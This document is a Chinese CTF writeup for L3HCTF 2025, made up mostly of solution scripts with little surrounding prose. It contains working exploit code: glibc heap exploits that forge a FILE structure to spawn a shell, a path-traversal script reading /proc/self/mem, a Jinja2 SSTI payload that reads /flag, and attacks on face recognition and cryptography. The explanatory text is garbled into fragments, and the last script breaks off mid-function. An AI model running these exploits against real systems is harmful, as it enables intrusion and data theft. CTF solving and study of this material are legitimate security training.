# L3HCTF Writeup

> 原文: https://www.ctfiot.com/262264.html
> ID: 262264

本次 L3HCTF2025，我们 XMCVE-Polaris 战队排名第 9 。

排名

队伍

总分

1

SU

11593.11

2

Arr3stY0u

10705.41

3

Lilac

9747.42

4

N1STAR

8451.15

5

Spirit+

8300.47

6

V&N

8234.81

7

AAA

7822.98

8

Scr1w

7532.63

9

XMCVE-Polaris

7479.07

10

UKFC

7076

The content flag is come on little brave fox

Repalce letter O with number zero letter L with one

Replace letter A with @

make free with e upcase

swap ? with  ? ? ?

，把

就有

低位后，CopperSmith恢复

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:222328705

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!

PS:团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Neko205


```
from pwn import *

def add(idx, size, content=b'a'):
    #add chunk 0xe
    p.sendlineafter('on: ', '1')
    p.sendlineafter('): ', str(idx))
    p.sendafter('): ', str(size))
    p.sendafter('nt: ', content)

def dele(idx):
    p.sendlineafter('on: ', '2')
    p.sendlineafter('): ', str(idx))
    
def show(idx):
    p.sendlineafter('on: ', '3')
    p.sendlineafter('): ', str(idx))

while1:
    p = process('./vul2')
    # p = remote('1.95.8.146', 9999)
    libc = ELF('./lib/libc.so.6')
    p.sendlineafter('> ', '5')
    add(0xf, 0x8)
    add(0xe, 0x8)
    add(0xd, 0x430)
    add(0xc, 0x8)
    add(0xb, 0x8)
    dele(0xc)
    dele(0xd)
    dele(0xe)

    p.sendlineafter('on: ', '4')
    p.sendlineafter('> ', '1')
    payload = b'a'*0x103+p8(0x17)+p16(0x529A)
    try:
        p.sendline(payload)
        show(0x8)
        p.recvuntil('---n')
        heapbase = u64(p.recvline()[:-1].ljust(8, b'x00'))-0x750
        heap = heapbase + 0x2e0
        print(hex(heapbase))
        add(1, 8, p64(heap))
        show(4)
        p.recvuntil('---n')
        libc.address = u64(p.recvline()[:-1].ljust(8, b'x00'))-0x203b20
        print(hex(libc.address))
        stdout = libc.address + 0x2045c0
        wfile_jump = libc.address + 0x202228
        fake_io = flat({
                0x0:b' sh',
                0xa0:p64(stdout),
                0x10:p64(libc.symbols['system']),
                0x20:p64(stdout),
                0xd8: p64(wfile_jump + 0x48 - 0x38),
                0x88:p64(stdout-0x30),
                0xe0:p64(stdout-8),
        },filler=b'x00')
        dele(1)
        add(1, 8, p64(heapbase+0x10))
        dele(4)
        pay1 = b''
        pay1 = p16(0)*((0x400-0x20)//0x10)+p16(1)
        pay1 = pay1.ljust(0x270, b'x00')+p64(stdout-0x10)
        add(2, 0x280, pay1)
        dele(1)
        add(1, 0x3f0, p64(0)*2+fake_io)
        p.interactive()
        break
    except:
        p.close()
```



```
from pwn import *

def add(idx, size, content=b'a'):
    #add chunk 0xe
    p.sendlineafter('on: ', '1')
    p.sendlineafter('): ', str(idx))
    p.sendafter('): ', str(size))
    p.sendafter('nt: ', content)

def dele(idx):
    p.sendlineafter('on: ', '2')
    p.sendlineafter('): ', str(idx))
    
def show(idx):
    p.sendlineafter('on: ', '3')
    p.sendlineafter('): ', str(idx))

# p = process('./vul2_revenge')
# p = gdb.debug('./vul2_revenge', 'b *$rebase(0x1828)')
p = remote('1.95.8.146', 19999)
libc = ELF('./lib/libc.so.6')
p.sendlineafter('> ', '5')
add(0xf, 0x500)
add(0xe, 0x40)
add(0, 0x8)
dele(0xf)
add(0xf, 0x4e0)
dele(0xe)
p.sendlineafter('on: ', '4')
p.sendlineafter('> ', '1')
payload = b'a'*0x23+p8(0x37)+p8(0x6a)
p.sendline(payload)
p.sendlineafter('> ', '5')
show(0x8)
p.recvuntil('---n')
heapbase = u64(p.recvline()[:-1].ljust(8, b'x00'))-0x750-0x90-0x30
print(hex(heapbase))
add(1, 0x40, p64(heapbase+0x790))
show(0xc)
p.recvuntil('---n')
libc.address = u64(p.recvline()[:-1].ljust(8, b'x00'))-0x203b20
print(hex(libc.address))
dele(1)
add(1, 0x40, p64(heapbase+0x10))
dele(0xc)
stdout = libc.address + 0x2045c0
wfile_jump = libc.address + 0x202228
fake_io = flat({
        0x0:b' sh',
        0xa0:p64(stdout),
        0x10:p64(libc.address+0x582d2),
        0x20:p64(stdout),
        0xd8: p64(wfile_jump + 0x48 - 0x38),
        0x88:p64(stdout-0x30),
        0xe0:p64(stdout-8),
},filler=b'x00')
pay1 = b''
pay1 = p16(0)*((0x400-0x20)//0x10)+p16(1)
pay1 = pay1.ljust(0x270, b'x00')+p64(stdout-0x10)
add(2, 0x280, pay1)
dele(1)
add(1, 0x3f0, p64(0)*2+fake_io)
p.interactive()
```



```
worker_processes 1;

events {
    use epoll;
    worker_connections 10240;
}

http {
    include mime.types;
    default_type text/html;
    access_log off;
    error_log /dev/null;
    sendfile on;

    init_by_lua_block {
        f = io.open("/flag", "r")
        f2 = io.open("/password", "r")
        flag = f:read("*all")
        password = f2:read("*all")
        f:close()
        password = string.gsub(password, "[nr]", "")
        os.remove("/flag")
        os.remove("/password")
    }

    server {
        listen 80 default_server;
        location / {
            content_by_lua_block {
                ngx.say("hello, world!")
            }
        }

        location /static {
            alias /www/;
            access_by_lua_block {
                if ngx.var.remote_addr ~= "127.0.0.1" then
                    ngx.exit(403)
                end
            }
            add_header Accept-Ranges bytes;
        }

        location /download {
            access_by_lua_block {
                local blacklist = {"%.", "/", ";", "flag", "proc"}
                local args = ngx.req.get_uri_args()
                for k, v in pairs(args) do
                    for _, b in ipairs(blacklist) do
                        if string.find(v, b) then
                            ngx.exit(403)
                        end
                    end
                end
            }
            add_header Content-Disposition "attachment; filename=download.txt";
            proxy_pass http://127.0.0.1/static$arg_filename;
            body_filter_by_lua_block {
                local blacklist = {"flag", "l3hsec", "l3hctf", "password", "secret", "confidential"}
                for _, b in ipairs(blacklist) do
                    if string.find(ngx.arg[1], b) then
                        ngx.arg[1] = string.rep("*", string.len(ngx.arg[1]))
                    end
                end
            }
        }

        location /read_anywhere {
            access_by_lua_block {
                if ngx.var.http_x_gateway_password ~= password then
                    ngx.say("go find the password first!")
                    ngx.exit(403)
                end
            }
            content_by_lua_block {
                local f = io.open(ngx.var.http_x_gateway_filename, "r")
                if not f then
                    ngx.exit(404)
                end
                local start = tonumber(ngx.var.http_x_gateway_start) or 0
                local length = tonumber(ngx.var.http_x_gateway_length) or 1024
                if length > 1024 * 1024 then
                    length = 1024 * 1024
                end
                f:seek("set", start)
                local content = f:read(length)
                f:close()
                ngx.say(content)
                ngx.header["Content-Type"] = "application/octet-stream"
            }
        }
    }
}
```



```
local blacklist = {"%.", "/", ";", "flag", "proc"}
local args = ngx.req.get_uri_args()
```



```
import requests

url = "http://1.95.8.146:17794/download"
filename = "../proc/self/fd/6"# 目标文件路径

params = {f"a{i}": str(i) for i in range(1, 101)}
params["filename"] = filename

def read_file_byte_by_byte(url, params, max_bytes=1024*1024):
    headers = {}
    content = b""

    for i in range(max_bytes):
        headers['Range'] = f"bytes={i}-{i}"
        try:
            r = requests.get(url, params=params, headers=headers)
            if r.status_code in [206, 200]:
                chunk = r.content
                ifnot chunk:
                    print(f"[*] 读取结束，位置{i}无数据")
                    break
                content += chunk
                print(f"[+] 读取字节 {i}，内容: {chunk}")
            else:
                print(f"[!] 状态码 {r.status_code}，停止读取")
                break
        except Exception as e:
            print(f"[!] 请求异常: {e}")
            break

    return content

if __name__ == "__main__":
    data = read_file_byte_by_byte(url, params, max_bytes=1024)
    print("读取内容：")
    print(data.decode(errors='ignore'))
```



```
import requests
import re
import time

# === 配置项 ===
TARGET = "http://43.138.2.216:17794/read_anywhere"
PASSWORD = "passwordismemeispasswordsoneverwannagiveyouup"
CHUNK_SIZE = 4096# 每次读取的字节数
FLAG_PREFIX = b"L3HCTF{"

# === 读取 maps ===
def get_readable_ranges():
    headers = {
        "X-Gateway-Password": PASSWORD,
        "X-Gateway-Filename": "/proc/self/maps",
        "X-Gateway-Start": "0",
        "X-Gateway-Length": "65536"
    }

    print("[*] 请求 /proc/self/maps ...")
    r = requests.get(TARGET, headers=headers)
    if r.status_code != 200:
        raise RuntimeError(f"无法读取 maps: {r.status_code}")

    ranges = []
    for line in r.text.splitlines():
        m = re.match(r'^([0-9a-fA-F]+)-([0-9a-fA-F]+) ([rwxp-]{4})', line)
        if m and'r'in m.group(3):
            start = int(m.group(1), 16)
            end = int(m.group(2), 16)
            ranges.append((start, end))
    print(f"[+] 找到 {len(ranges)} 个可读内存段")
    return ranges

# === 搜索内存中包含 flag 的区域 ===
def search_flag_in_mem(ranges):
    for start, end in ranges:
        print(f"[*] 扫描内存段: {hex(start)} - {hex(end)}")
        offset = 0
        while start + offset < end:
            size = min(CHUNK_SIZE, end - (start + offset))
            headers = {
                "X-Gateway-Password": PASSWORD,
                "X-Gateway-Filename": "/proc/self/mem",
                "X-Gateway-Start": str(start + offset),
                "X-Gateway-Length": str(size)
            }

            try:
                r = requests.get(TARGET, headers=headers, timeout=5)
                if r.status_code != 200:
                    print(f"[!] 读取失败 status={r.status_code} offset={offset}")
                    break
                data = r.content
                if FLAG_PREFIX in data:
                    index = data.find(FLAG_PREFIX)
                    # 简单截断 flag（直到遇到右大括号或 50 字节以内）
                    tail = data[index:index + 50]
                    match = re.search(rb'L3HCTF{[^}]{1,48}}', tail)
                    if match:
                        print(f"n🎉 找到 flag: {match.group(0).decode()}")
                        returnTrue
                    else:
                        print(f"[?] 找到前缀但无法确定完整 flag: {tail}")
                        returnTrue
                offset += size
            except Exception as e:
                print(f"[!] 请求异常: {e}")
                break
    print("[-] 未找到 flag")
    returnFalse

if __name__ == "__main__":
    ranges = get_readable_ranges()
    found = search_flag_in_mem(ranges)
    ifnot found:
        print("[-] flag 未找到")
```



```
es = requests.get(f"http://127.0.0.1/get_last_ip/{username}")
```



```
import requests
import random
import string

def generate_random_png_username(length=8):
    """生成随机用户名（格式：随机字符串 + '.png'）"""
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    returnf"{random_str}.png"

def exploit():
    base_url = "your_IP"
    username = generate_random_png_username()  # 随机生成 .png 用户名
    password = "hacked_password"# 固定密码（与原始脚本一致）

    session = requests.Session()

    # 更可靠的SSTI payload - 直接读取文件
    ssti_payload = (
        "{% set chr=lipsum.__globals__.__builtins__.chr %}"
        "{{ lipsum.__globals__.__builtins__.open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read() }}"
    )
    headers = {"X-Forwarded-For": ssti_payload}

    # 1. 注册用户
    print(f"[+] 注册用户: {username}")
    register_data = {
        "username": username,
        "password": password,
        "bio": "SSTI Attack Demo",
        "submit": "Sign Up"
    }
    register_response = session.post(
        f"{base_url}/register",
        data=register_data
    )
    print(register_response.text)

    # 2. 登录并注入SSTI payload
    print("n[+] 登录并注入SSTI")
    login_data = {
        "username": username,
        "password": password,
        "submit": "Log In"
    }
    login_response = session.post(
        f"{base_url}/login",
        headers=headers,
        data=login_data
    )
    print(login_response.text)

    # 3. 触发SSTI漏洞
    print("n[+] 触发SSTI执行")
    routes = [
        f"/get_last_ip/{username}",
        f"/ip_detail/{username}"
    ]

    for route in routes:
        print(f"nAccessing {route}:")
        response = session.get(f"{base_url}{route}")
        print(response.text)

if __name__ == "__main__":
    exploit()
```



```
pip install torch torchvision fastapi uvicorn pillow numpy
```



```
import torch
import torch.nn as nn
import torch.optim as optim
from torchvision.models import shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights
import json
import numpy as np
from PIL import Image

# 加载模型
model = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)
model.fc = nn.Identity() 
model.eval()

# load
with open('embedding.json', 'r') as f:
    user_embedding_list = json.load(f)
user_embedding = torch.tensor(user_embedding_list, dtype=torch.float32).unsqueeze(0)  # 

# 初始化
input_image = torch.rand((1, 3, 224, 224), requires_grad=True)  # 需要梯度

optimizer = optim.Adam([input_image], lr=0.1)

loss_fn = nn.MSELoss()

# 循环
max_iters = 1000
for i in range(max_iters):
    optimizer.zero_grad()

    gen_embedding = model(input_image)

    # 计算
    loss = loss_fn(gen_embedding, user_embedding)

    loss.backward()
    optimizer.step()

    input_image.data = torch.clamp(input_image.data, 0, 1)

    if i % 100 == 0:
        print(f"Iteration {i}: Loss = {loss.item():.8f}")

    # 阈值5e-6
    if loss.item() < 5e-6:
        print(f"Success! Loss < 5e-6 at iteration {i}")
        break

# 保存
gen_image = input_image.squeeze(0).detach()
gen_image = gen_image.permute(1, 2, 0).numpy()  # 转为HWC格式
gen_image = (gen_image * 255).astype(np.uint8) 
Image.fromarray(gen_image).save('generated_image.png')
print("Generated image saved as 'generated_image.png'")
```



```
curl -X POST "http://1.95.8.146:50001/signin/" -H "Content-Type: multipart/form-data" -F "file=@generated_image.png"

{"status":"L3HCTF{f4c3_r3c0gn1t10n_15_n0t_s0_s3cur3_4ft3r_4ll}"}
```



```
from Crypto.Util.number import *
import gmpy2

n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921
c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984
hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333
hint2 = 10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907

A = (hint2 - 1) // n
k = (A * inverse(3,n)) % n
p_low = k
R.<x> = PolynomialRing(Zmod(n))
f = x*2^400 + p_low
res = f.monic().small_roots(X=2^112,beta=0.33,epsilon=0.02)

p = int(res[0]*2^400 + p_low)
"""
模p下就可以求解
dp = inverse(65537,p-1)
m = pow(c,dp,p)
print(long_to_bytes(m))
# L3HCTF{1s_4h1s_r3a11y_m4th?}
"""
r = gmpy2.gcd(n // p,hint1)
q = n // p // r
d = inverse(65537,(p-1)*(q-1)*(r-1))
m = pow(c,d,n)
print(long_to_bytes(m))
```



```
import itertools
from Crypto.Util.number import *

def small_roots(f, bounds, m=1, d=None):
    ifnot d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()

    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficients_monomials()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []

N = 99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609
e = 74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827
c = 98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879

R.<x,y> = PolynomialRing(Zmod(e),implementation='generic')
f = x * (N^4 - y + 1) - 1
res = small_roots(f,(2^1021,2^2048),m=3,d=4)

r = int(res[0][0])
t = int(res[0][1])

var('p,q')
f1 = p*q == N
f2 = p^4 + q^4 == t
solutions = solve([f1,f2],[p,q])

p = solutions[-2][0].rhs()
q = solutions[-2][1].rhs()
phi = (p^4 - 1)*(q^4 - 1)
d = inverse(e,phi)
def decrypt(c_poly, N, d):
    n = 4
    r = 2
    R = Integers(N)
    P = PolynomialRing(R, 't')
    t = P.gen()
    Q = P.quotient(t**n - r)

    c_poly_Q = Q(c_poly)
    m_poly = (c_poly_Q ** d).lift()
    m = m_poly[0]
    return m

m = decrypt(c,N,d)
print(long_to_bytes(int(m)))
```



```
import sympy
from ecdsa import NIST256p

# Curve parameters for NIST256p
curve = NIST256p
n = curve.order

signatures = [
    {'h': 5832921593739954772384341732387581797486339670895875430934592373351528180781, 'r': 78576287416983546819312440403592484606132915965726128924031253623117138586396, 's': 108582979377193966287732302562639670357586761346333866965382465209612237330851},
    {'h': 85517239535736342992982496475440962888226294744294285419613128065975843025446, 'r': 60425040031360920373082268221766168683222476464343035165195057634060216692194, 's': 27924509924269609509672965613674355269361001011362007412205784446375567959036},
    {'h': 90905761421138489726836357279787648991884324454425734512085180879013704399530, 'r': 75779605492148881737630918749717271960050893072832415117470852442721700807111, 's': 72740499400319841565890543635298470075267336863033867770902108413176557795256},
    {'h': 103266614372002123398101167242562044737358751274736728792365384600377408313142, 'r': 89519601474973769723244654516140957004170211982048028366151899055366457476708, 's': 23639647021855356876198750083669161995553646511611903128486429649329358343588},
    {'h': 9903460667647154866199928325987868915846235162578615698288214703794150057571, 'r': 17829304522948160053211214227664982869100868125268116260967204562276608388692, 's': 74400189461172040580877095515356365992183768921088660926738652857846750009205},
    {'h': 54539896686295066164943194401294833445622227965487949234393615233511802974126, 'r': 66428683990399093855578572760918582937085121375887639383221629490465838706027, 's': 25418035697368269779911580792368595733749376383350120613502399678197333473802}
]

d = sympy.Symbol('d')

u = []
v = []
for sig in signatures:
    s_inv = pow(sig['s'], -1, n)
    u.append((s_inv * sig['h']) % n)
    v.append((s_inv * sig['r']) % n)

k = [ui + vi * d for ui, vi in zip(u, v)]

M_list = [
    [k[0]**2, k[0], 1],
    [k[1]**2, k[1], 1],
    [k[2]**2, k[2], 1]
]
M = sympy.Matrix(M_list)

Y = sympy.Matrix([k[1], k[2], k[3]])

# Solve for a*det(M), b*det(M), c*det(M)
M_adj = M.adjugate()
sol = M_adj * Y
detM = M.det()

# k[4] * detM - (a*detM*k[3]**2 + b*detM*k[3] + c*detM) = 0
final_poly_expr = sympy.expand(k[4] * detM - (sol[0] * k[3]**2 + sol[1] * k[3] + sol[2]))

final_poly = sympy.Poly(final_poly_expr, d, domain=sympy.GF(n))

roots = final_poly.ground_roots()

private_key = list(roots.keys())[0]

print(f"Found private key (d): {private_key}")
print(f"The flag is: L3HCTF{{{private_key}}}")
```



```
#include<stdio.h>
#include"defs.h"
usingnamespacestd;
int main(){
unsignedchar  enc[256]; // x20
unsigned __int64 i; // x8
unsigned __int64 ii; // x15
unsigned __int8 v11; // w13
  _BYTE v19[256]; // [xsp+10h] [xbp-50h] BYREF

unsignedchar aDghpc2lzywtleq[] =
{
0x64, 0x47, 0x68, 0x70, 0x63, 0x32, 0x6C, 0x7A, 0x59, 0x57, 
0x74, 0x6C, 0x65, 0x51
};

     qmemcpy(&v19[8], "O2*", 3);
  *(_QWORD *)v19 = 0xFC020A4C0E2C7290LL;;
*(_QWORD *)enc = 0xA409663A025150CLL;
    *((_QWORD *)enc + 1) = 0x1FE106294065165CLL;
      *((_QWORD *)enc + 2) = 0xFC020A4C0E2C7290LL;
       *(_QWORD *)(enc + 19) = *(_QWORD *)&v19[3];
// for (int i=0;i<27;i++){
//     printf("0x%02x,",enc[i]);
// }

// unsigned char  enc1[]={
//    0x0c,0x15,0x25,0xa0,0x63,0x96,0x40,0x0a,0x5c,0x16,0x65,0x40,0x29,0x06,0xe1,0x1f,0x90,0x72,0x2c,0x0e,0x4c,0x0a,0x02,0xfc,0x4f,0x32,0x2a
// };

    for ( i = 0; i != 27; ++i ){
        for(int flag =0;flag<256;flag++){ 
            v11 = aDghpc2lzywtleq[(unsigned __int8)(((2 * i) | 1) - 14 * ((147 * ((unsigned __int8)(2 * i) | 1u)) >> 11))]
                + (flag ^ aDghpc2lzywtleq[i%0xEu]);
            char tmp = aDghpc2lzywtleq[(unsigned __int8)(i + 4) % 0xEu]^ ((v11 << (aDghpc2lzywtleq[(unsigned __int8)(i + 3) % 0xEu] & 7))  | (v11 >> (-aDghpc2lzywtleq[(unsigned __int8)(i + 3) % 0xEu] & 7)));
            if((tmp&0xff)==enc[i]){
                printf("%c",flag);
            }
        }
    }
//L3HCTF{ez_rust_reverse_lol}
}
```



```
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <openssl/md5.h>

#define TMIN   1751990400u
#define TMAX   1752052051u
#define TARGET "8a2fc1e9e2830c37f8a7f51572a640aa"

staticuint32_t rng_state;

/* ------------- 线性反馈伪随机，与原算法等价 ------------- */
static inline uint32_t prng_next(void)
{
    uint32_t x = rng_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    rng_state = x;
    return x & 0x7fffffffU;
}

/* ------------- 16-byte MD5 → 32-byte lower-hex ------------- */
static void md5_to_hex(const unsigned char *in, char *out)
{
    staticconstchar lut[] = "0123456789abcdef";
    for (int i = 0; i < 16; ++i) {
        uint8_t v = in[i];
        out[i * 2]     = lut[v >> 4];
        out[i * 2 + 1] = lut[v & 0x0f];
    }
    out[32] = ' ';
}

/* ------------- 主程序 ------------- */
int main(void)
{
    unsignedchar digest[16];
    char hex[33];
    char query[256];

    for (uint32_t t = TMIN; t <= TMAX; ++t) {

        /* 初始化 PRNG */
        rng_state = t;

        uint32_t a = 0, b = 0, x = 0, y = 0;
        uint32_t loop = prng_next();

        /* 每轮消耗 4 个随机数，完全对齐原逻辑 */
        while (loop--) {
            a = prng_next();
            b = prng_next();
            x = prng_next();
            y = prng_next();
        }
        uint32_t r = prng_next();

        int qlen = snprintf(query, sizeof(query),
            "salt=tlkyeueq7fej8vtzitt26yl24kswrgm5"
            "&t=%u&r=%u&a=%u&b=%u&x=%u&y=%u",
            t, r, a, b, x, y);

        MD5((unsignedchar *)query, qlen, digest);
        md5_to_hex(digest, hex);

        if (strcmp(hex, TARGET) == 0) {
            puts(">>> MATCH FOUND! <<<");
            puts(query);
            return0;
        }
    }

    puts("扫描完毕，未命中目标。");
    return0;
}
```



```
sbox = [0x122F2C9C, 0xE3BCCAE7, 0xD0FFC0F2, 0xD9A12544, 0x8A27992F,
        0x55B1B935, 0x9110B161, 0x92811564, 0x5CE9B359, 0x77C79A51,
        0x4265527A, 0x8AB57C4B, 0x11529FA4, 0x9D9F63FF, 0xA970B936,
        0xC8EABA0D, 0x9A0EB4AA, 0xB0BC6E7F, 0x9784B100, 0x70DCD3AE,
        0x6057A44E, 0x89187658, 0xE00098A8, 0x45773540, 0xF9374F1A,
        0x913FA548]
```



```
1️⃣ 单块测试
明文: b'09876543'
明文(hex): 3039383736353433
密文(hex): 78f2ca6e7e5c0762
解密结果: bytearray(b'09876543')
解密(hex): 3039383736353433
解密成功: True

2️⃣ 已知密文解密
密文(hex): 1BBBA1F2E97C87218A37FD0A941A81BC401EE3AA732ED83F84B87142CC358B39
解密结果: b'5fd277be39046905ef6348ba89131922'
解密(hex): 3566643237376265333930343639303565663633343862613839313331393232
ASCII解析: '5fd277be39046905ef6348ba89131922'

3️⃣ 长文本测试
原文: b'Hello, this is a test message for Feistel cipher!'
加密后(hex): cbeb26cd874fd2c37e5ded66b52197bbcf2836d3660add7522c77367881ad305148edfe7bf21913a3028888faaf90ff691f1ab74f81d9481
解密后: b'Hello, this is a test message for Feistel cipher!'
长文本解密成功: True

🔬 S盒分析
S盒长度: 26
S盒前8个值: ['0x122f2c9c', '0xe3bccae7', '0xd0ffc0f2', '0xd9a12544', '0x8a27992f', '0x55b1b935', '0x9110b161', '0x92811564']
唯一值数量: 26/26
平均值: 2366628618 (0x8d0fe309)
```



```
def a32small(byte_array):
    """字节数组转32位小端整数数组"""
    return [int.from_bytes(byte_array[i:i + 4], byteorder='little', signed=False) for i in range(0, len(byte_array), 4)]

def b32small(dword_array):
    """32位整数数组转字节数组"""
    byte_list = bytearray()
    for dword in dword_array:
        byte_list.extend(dword.to_bytes(4, byteorder='little'))
    return byte_list

# S盒 - 密钥材料
sbox = [0x122F2C9C, 0xE3BCCAE7, 0xD0FFC0F2, 0xD9A12544, 0x8A27992F,
        0x55B1B935, 0x9110B161, 0x92811564, 0x5CE9B359, 0x77C79A51,
        0x4265527A, 0x8AB57C4B, 0x11529FA4, 0x9D9F63FF, 0xA970B936,
        0xC8EABA0D, 0x9A0EB4AA, 0xB0BC6E7F, 0x9784B100, 0x70DCD3AE,
        0x6057A44E, 0x89187658, 0xE00098A8, 0x45773540, 0xF9374F1A,
        0x913FA548]

def ROL32(x, shift):
    """32位循环左移"""
    shift = shift & 31# 确保shift在0-31范围内
    return ((x << shift) | (x >> (32 - shift))) & 0xFFFFFFFF

def ROR32(x, shift):
    """32位循环右移"""
    shift = shift & 31# 确保shift在0-31范围内
    return ((x >> shift) | (x << (32 - shift))) & 0xFFFFFFFF

def feistel_encrypt(plaintext_bytes):
    """
    Feistel加密函数
    输入: 8字节明文
    输出: 8字节密文
    """
    # 转换为32位整数对
    m = a32small(plaintext_bytes)

    # 初始化: 加上S盒的前两个值
    num = [(m[0] + sbox[0]) & 0xFFFFFFFF, (m[1] + sbox[1]) & 0xFFFFFFFF]

    # 12轮Feistel变换
    for i in range(1, 13):
        # 第一步: 变换左半部分
        num[0] = (sbox[2 * i] + ROL32(num[0] ^ num[1], num[1] & 31)) & 0xFFFFFFFF

        # 第二步: 变换右半部分
        num[1] = (sbox[2 * i + 1] + ROL32(num[0] ^ num[1], num[0] & 31)) & 0xFFFFFFFF

        # 第三步: 异或交换
        num[0] = (num[0] ^ num[1]) & 0xFFFFFFFF

    # 转换回字节数组
    return b32small(num)

def feistel_decrypt(ciphertext_bytes):
    """
    Feistel解密函数
    输入: 8字节密文
    输出: 8字节明文
    """
    # 转换为32位整数对
    num = a32small(ciphertext_bytes)

    # 12轮逆向Feistel变换
    for i in range(12, 0, -1):
        # 逆向第三步: 异或交换的逆操作
        num[0] = (num[0] ^ num[1]) & 0xFFFFFFFF

        # 逆向第二步: 右半部分的逆变换
        # num[1] = sbox[2*i+1] + ROL32(num[0] ^ num[1], num[0] & 31)
        # 所以: ROL32(num[0] ^ num[1], num[0] & 31) = num[1] - sbox[2*i+1]
        # 因此: num[0] ^ num[1] = ROR32(num[1] - sbox[2*i+1], num[0] & 31)
        temp = (num[1] - sbox[2 * i + 1]) & 0xFFFFFFFF
        num[1] = (ROR32(temp, num[0] & 31) ^ num[0]) & 0xFFFFFFFF

        # 逆向第一步: 左半部分的逆变换
        temp = (num[0] - sbox[2 * i]) & 0xFFFFFFFF
        num[0] = (ROR32(temp, num[1] & 31) ^ num[1]) & 0xFFFFFFFF

    # 逆向初始化: 减去S盒的前两个值
    num = [(num[0] - sbox[0]) & 0xFFFFFFFF, (num[1] - sbox[1]) & 0xFFFFFFFF]

    # 转换回字节数组
    return b32small(num)

def encrypt_multiple_blocks(plaintext_bytes):
    """
    加密多个8字节块
    """
    if len(plaintext_bytes) % 8 != 0:
        # 如果不是8的倍数，进行PKCS7填充
        padding_len = 8 - (len(plaintext_bytes) % 8)
        plaintext_bytes += bytes([padding_len] * padding_len)

    result = bytearray()
    for i in range(0, len(plaintext_bytes), 8):
        block = plaintext_bytes[i:i + 8]
        encrypted_block = feistel_encrypt(block)
        result.extend(encrypted_block)

    return bytes(result)

def decrypt_multiple_blocks(ciphertext_bytes):
    """
    解密多个8字节块
    """
    result = bytearray()
    for i in range(0, len(ciphertext_bytes), 8):
        block = ciphertext_bytes[i:i + 8]
        decrypted_block = feistel_decrypt(block)
        result.extend(decrypted_block)

    # 移除PKCS7填充
    if result:
        padding_len = result[-1]
